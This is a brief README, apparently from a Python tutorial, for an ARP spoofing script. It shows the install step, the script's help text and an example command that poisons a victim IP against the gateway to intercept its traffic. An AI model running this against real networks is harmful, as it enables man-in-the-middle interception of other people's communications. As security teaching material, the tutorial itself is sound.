# [Building an ARP Spoofer](https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy)
to run this:
- `pip3 install -r requirements.txt`
- 
    ```
    python3 arp_spoof.py --help
    ```
    **Output**:
    ```
    usage: arp_spoof.py [-h] [-v] target host

    ARP spoof script

    positional arguments:
    target         Victim IP Address to ARP poison
    host           Host IP Address, the host you wish to intercept packets for
                    (usually the gateway)

    optional arguments:
    -h, --help     show this help message and exit
    -v, --verbose  verbosity, default is True (simple message each second)
    ```
    For instance, if you want to spoof **192.168.1.2** and the gateway is **192.168.1.1**:
    ```
    python3 arp_spoof 192.168.1.2 192.168.1.1 --verbose
    ```